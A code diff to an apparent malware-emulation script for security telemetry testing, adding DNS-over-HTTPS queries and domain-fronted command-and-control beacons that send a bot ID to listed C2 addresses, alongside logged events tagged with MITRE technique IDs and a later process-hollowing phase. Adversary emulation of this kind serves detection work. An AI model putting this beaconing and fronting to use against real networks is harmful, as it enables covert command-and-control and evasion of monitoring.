@@ -24,6 +24,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
+from c2_helper import emit_doh_query, fronted_beacon, jittered_sleep, FRONT_DOMAINS
 
 
 # =============================================================================
@@ -103,7 +104,7 @@ def main() -> int:
         pass
     jitter(0.3, 0.4)
 
-    # --- Phase 3: DNS Beaconing ---
+    # --- Phase 3: DNS Beaconing + DoH ---
     set_phase("dns_beacon")
     emit("PROCESS", "CREATE_THREAD", "svchost_bot.exe", "INFO",
          source_process="svchost_bot.exe", detail="Starting DNS beaconing to C2 domains")
@@ -116,26 +117,33 @@ def main() -> int:
             socket.getaddrinfo(domain, 443, socket.AF_INET, socket.SOCK_STREAM)
         except (socket.gaierror, OSError):
             pass
+        emit_doh_query(domain, process_name="svchost_bot.exe")
         jitter(1.5, 1.0)
 
-    # --- Phase 4: HTTP C2 Beaconing ---
+    # --- Phase 4: HTTP C2 Beaconing with domain fronting ---
     set_phase("http_beacon")
     for i in range(6):
         ip = random.choice(C2_IPS)
         port = random.choice(C2_PORTS)
+        front = random.choice(FRONT_DOMAINS)
+        bot_id = f"BOT-{random.randint(10000, 99999)}"
+
         emit("NETWORK", "CONNECT", f"{ip}:{port}", "CRITICAL",
              source_process="svchost_bot.exe",
              protocol="TCP", direction="outbound",
-             detail=f"C2 beacon #{i+1}", technique_id="T1071.001")
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            sock.connect((ip, port))
-            sock.send(json.dumps({"bot_id": f"BOT-{random.randint(10000,99999)}", "os": "Windows 10"}).encode())
-            sock.close()
-        except (ConnectionRefusedError, OSError, socket.timeout):
-            pass
-        jitter(1.5, 1.0)
+             detail=f"C2 beacon #{i+1} (fronted: {front})", technique_id="T1071.001")
+        emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
+             source_process="svchost_bot.exe",
+             target_host=front, target_ip=ip,
+             detail=f"Domain fronting via {front} → {ip}", technique_id="T1090")
+
+        ok = fronted_beacon(ip, port, front,
+                            {"bot_id": bot_id, "os": "Windows 10", "beacon_seq": i + 1})
+        if not ok:
+            from c2_helper import backoff_sleep
+            backoff_sleep(i, base=1.0, cap=8.0)
+        else:
+            jittered_sleep(1.5, 1.0)
 
     # --- Phase 5: Process Hollowing ---
     if env != EnvSafety.SUSPICIOUS:
